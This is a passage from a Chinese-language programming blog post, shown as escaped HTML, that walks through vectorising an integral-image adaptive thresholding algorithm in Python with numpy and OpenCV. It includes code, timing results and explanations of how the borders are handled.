    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是时间：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
Image shape 640x480
opencv_way take 35.920926 ms
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;好了， 可以全剧终了。&lt;br /&gt;
简单的6行代码， 纯粹的暴力美学。 速度快了40倍。（你学到了么？）&lt;br /&gt;
这里我们借助opencv 的 &lt;code&gt;filter2D&lt;/code&gt;方法， 自己定义了一个kernel， 用来求一个点周围区域的平均值， 接下来的计算就全部交给opencv了。 &lt;br /&gt;
关于opencv， 有一点需要补充， &lt;strong&gt;opencv表示， numpy是辣鸡， 请多使用opencv自带的函数&lt;/strong&gt;。  &lt;/p&gt;
&lt;h2 id="_6"&gt;&lt;a name="user-content-_6" href="#_6" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;向量化&lt;/h2&gt;
&lt;p&gt;还不能全剧终， 接下来是重点， numpy是为矩阵计算而生的， 我们前面一直按照C的思维来对单个点做操作， 而且for循环的存在导致速度下降太多， 接下来我们要寻求把for循环替换掉， 改成向量的计算。&lt;/p&gt;
&lt;p&gt;对于numpy来说， 比如我有两个2维矩阵A和B， 要计算两个矩阵上所有点的差， 从速度上来说， &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;A - B &amp;gt; A[i] - B[i] &amp;gt; A[i,j] - B[i,j]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们现在希望把所有的for循环， 替换为矩阵的计算 &lt;code&gt;A - B&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。  &lt;/p&gt;
&lt;p&gt;对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。  &lt;/p&gt;
&lt;p&gt;其中造成整个for循环存在的关键因素是下面这句代码&lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， &lt;br /&gt;
这样就可以吧整个for循环计算化简成  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;D + A - C - B
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;那么怎么构造出这些矩阵呢？&lt;br /&gt;
想象一下， 把&lt;code&gt;integral_map[x1, y1]&lt;/code&gt;当成一个集合， 记为A， &lt;code&gt;integral_map[x1, y2]&lt;/code&gt;的集合记为B， &lt;code&gt;integral_map[x2, y1]&lt;/code&gt;的集合记为C，&lt;code&gt;integral_map[x2, y2]&lt;/code&gt;记为D。   &lt;/p&gt;
&lt;p&gt;以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 &lt;code&gt;integral_map[h-half_boxsize, w-half_boxsize]&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。  &lt;/p&gt;
&lt;p&gt;想象一下， 比如我们有一个5x5的矩阵， boxsize取3, &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  0 1 2 3 4
0 * * * * *
1 * * * * *
2 * * * * *
3 * * * * *
4 * * * * *
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点&lt;br /&gt;
计算(0,0)上的和的时候， 右下角取（1，1）， 左上角超出了边界，所以只能取（0，0）&lt;br /&gt;
计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）    &lt;/p&gt;
&lt;p&gt;所以我们可以构造出一个&lt;code&gt;(boxsize-1)/2&lt;/code&gt; 长度的边框，边框上的值和边界的值一样。 这样我们可以通过平移得到ABCD四个矩阵， 而不用额外的边界判断。 &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;vector_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;half_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;big_mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copyMakeBorder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;borderType&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BORDER_REPLICATE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;big_h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;big_mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;
    &lt;span class="c1"&gt;# 构造4个矩阵&lt;/span&gt;
    &lt;span class="c1"&gt;# top left&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;big_mat&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# bottom left&lt;/span&gt;
    &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;big_mat&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;big_h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# top right&lt;/span&gt;
    &lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;big_mat&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="c1"&gt;# bottom right&lt;/span&gt;
    &lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;big_mat&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;big_h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;

    &lt;span class="n"&gt;COUNT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_count_matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;COUNT&lt;/span&gt;
    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;inv_value&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵&lt;code&gt;COUNT&lt;/code&gt;来表示每个点上的窗口大小。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_count_matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    矩阵上每个点的值表示该点上的窗口覆盖的总点数。&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# faster than (boxsize-1) // 2&lt;/span&gt;
    &lt;span class="n"&gt;half_boxsize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="c1"&gt;# 窗口的真正大小并不是boxsize！而是（boxsize - 1）！&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ones&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ones&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;half_boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;half_boxsize&lt;/span&gt;
        &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看一下所需的时间&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
Image shape 640x480
vector_method take 22.166661 ms
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是&lt;code&gt;get_count_matrix&lt;/code&gt;函数显得非常的力不从心， 还可以寻找优化的办法。  &lt;/p&gt;
&lt;h2 id="_7"&gt;&lt;a name="user-content-_7" href="#_7" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;优化后的向量化方法&lt;/h2&gt;
&lt;p&gt;回想之前的整个过程， 我们对边界的处理实际上过于保守了， 导致计算窗口覆盖点数的时候过于小心翼翼了(不然boxsize-1是怎么得出来的， 都是泪啊)。&lt;/p&gt;
&lt;p&gt;我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉&lt;code&gt;get_count_matrix&lt;/code&gt;函数， 统一采用&lt;code&gt;(boxsize-1)*(boxsize-1)&lt;/code&gt;。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;optimized_vector_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
    &lt;span class="n"&gt;half_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copyMakeBorder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;borderType&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BORDER_REFLECT101&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;big_h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;
    &lt;span class="c1"&gt;# 构造4个矩阵&lt;/span&gt;
    &lt;span class="c1"&gt;# top left&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# bottom left&lt;/span&gt;
    &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;big_h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# top right&lt;/span&gt;
    &lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="c1"&gt;# bottom right&lt;/span&gt;
    &lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;big_h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:,&lt;/span&gt; &lt;span class="n"&gt;big_w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;

    &lt;span class="c1"&gt;# COUNT = get_count_matrix(w, h, boxsize)&lt;/span&gt;
    &lt;span class="n"&gt;COUNT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
